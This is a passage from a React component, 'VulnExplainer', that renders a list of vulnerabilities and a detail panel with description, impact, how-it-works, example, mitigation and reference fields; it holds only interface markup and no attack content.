                <span className={`text-xs font-medium rounded-full px-2.5 py-0.5 ${severityColor[v.severity]}`}>{v.severity}</span>
              </div>
            </button>
          ))}
        </div>
      ) : (
        <div className="space-y-6">
          <Button variant="outline" size="sm" onClick={() => setSelected(null)}>← Back to list</Button>

          <div className="flex items-start justify-between">
            <div>
              <h2 className="text-xl font-bold text-foreground">{selected.name}</h2>
              <p className="text-sm text-muted-foreground">{selected.id} · {selected.category}</p>
            </div>
            <span className={`text-xs font-medium rounded-full px-2.5 py-0.5 ${severityColor[selected.severity]}`}>{selected.severity}</span>
          </div>

          <div className="bg-card border rounded-lg p-5 space-y-4">
            <div>
              <h3 className="font-semibold text-foreground mb-1">What Is It?</h3>
              <p className="text-sm text-muted-foreground">{selected.description}</p>
            </div>
            <div>
              <h3 className="font-semibold text-foreground mb-1">Impact</h3>
              <p className="text-sm text-muted-foreground">{selected.impact}</p>
            </div>
            <div>
              <h3 className="font-semibold text-foreground mb-1">How It Works</h3>
              <pre className="text-sm text-muted-foreground bg-muted rounded-lg p-4 whitespace-pre-wrap font-mono">{selected.howItWorks}</pre>
            </div>
            <div>
              <h3 className="font-semibold text-foreground mb-1">Real-World Example</h3>
              <p className="text-sm text-muted-foreground">{selected.realWorldExample}</p>
            </div>
            <div>
              <h3 className="font-semibold text-foreground mb-1 flex items-center gap-2"><AlertTriangle className="h-4 w-4 text-secondary" /> Mitigation Steps</h3>
              <ul className="text-sm text-muted-foreground space-y-1 ml-4">
                {selected.mitigation.map((m, i) => (
                  <li key={i} className="list-disc">{m}</li>
                ))}
              </ul>
            </div>
            <div>
              <h3 className="font-semibold text-foreground mb-1">References</h3>
              <ul className="text-sm text-muted-foreground space-y-1">
                {selected.references.map((r, i) => (
                  <li key={i} className="text-primary">{r}</li>
                ))}
              </ul>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default VulnExplainer;
